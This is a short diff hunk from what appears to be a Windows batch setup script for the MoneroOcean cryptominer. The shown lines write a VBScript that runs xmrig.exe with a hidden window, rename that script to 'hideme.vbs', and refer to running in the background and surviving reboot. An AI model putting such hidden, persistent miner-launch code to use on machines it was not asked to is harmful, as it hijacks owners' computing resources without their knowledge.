@@ -261,7 +261,7 @@ echo Set oShell = CreateObject ("Wscript.Shell"^)
 echo Dim strArgs
 echo strArgs = "xmrig.exe"
 echo oShell.Run strArgs, 0, false
-) >> %userprofile%/moneroocean/file.vbs
+) >> %userprofile%/moneroocean/hideme.vbs
 rem preparing script background work and work under reboot
 
 if %ADMIN% == 1 goto ADMIN_MINER_SETUP
